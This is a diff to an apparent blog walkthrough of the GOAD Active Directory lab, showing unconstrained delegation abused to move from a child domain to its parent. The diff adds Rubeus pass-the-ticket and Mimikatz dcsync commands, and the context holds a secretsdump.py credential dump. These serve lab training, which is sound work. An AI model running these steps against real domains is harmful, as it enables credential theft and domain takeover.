@@ -135,7 +135,15 @@ secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
 
 ![deleg_unconcstrained_secrets_dump.png](/assets/blog/GOAD/deleg_unconcstrained_secrets_dump.png)
 
-> Another way of exploitation, is to do a ptt with Rubeus and launch a dcsync with Mimikatz but this implies to run Mimikatz on Winterfell and bypass the defender AV
+> Another way of exploitation, is to do a ptt with Rubeus and launch a dcsync with Mimikatz. Having a domain-joined machine should make this attack easier.
+
+```powershell
+.\Rubeus.exe ptt /ticket:doIFrzCCBaugAwIB......
+.\mimikatz.exe "lsadump::dcsync /domain:sevenkingdoms.local /user:kingslanding$" "exit"
+```
+
+![image](https://github.com/Mayfly277/mayfly277.github.io/assets/18597330/d1b83fd7-1c9e-4791-89a5-4489f287b9b2)
+
 
 > Unless you didn't notice, the unconstrained delegation abuse was here exploited to pass from the child to the parent domain ;) 
 {: .prompt-tip }
